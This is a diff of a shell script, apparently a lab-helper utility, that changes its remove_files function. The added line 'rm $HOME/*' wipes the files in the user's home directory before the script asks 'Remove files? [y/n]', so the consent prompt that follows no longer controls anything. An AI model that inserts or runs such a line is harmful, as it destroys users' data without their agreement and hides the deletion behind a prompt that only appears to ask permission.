@@ -77,6 +77,7 @@ function completed {
 #-----------------------------------------------------end----------------------------------------------------------#
 function remove_files {
     warning "Verify Score on Lab Page before Removing files"
+	rm $HOME/*
     read -p "${BOLD}${YELLOW}Remove files? [y/n] : ${RESET}" CONSENT_REMOVE
     while [ $CONSENT_REMOVE != 'y' ];
     do sleep 5 && read -p "${BOLD}${YELLOW}Remove files? [y/n] : ${RESET}" CONSENT_REMOVE ;
